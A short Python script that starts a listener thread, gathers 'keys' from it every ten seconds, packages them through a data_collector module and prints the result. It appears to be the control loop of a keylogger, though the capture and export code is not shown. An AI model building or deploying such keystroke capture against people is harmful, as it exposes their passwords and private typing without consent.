import threading
from time import sleep
from listener import Listener
from data_collector import Package

class Manager:
    def __init__(self):
        self.listener = Listener()
        self.process = threading.Thread(target=self.listener.run)

    def start(self):
        self.process.start()

    def stop(self):
        self.listener.stop()


if __name__ == '__main__':

    p = Manager()
    p.start()
    while 1:
        sleep(10)
        data = p.listener.get_keys()
        if data:
            a = Package(data)
            b = a.export_package()
            print(b)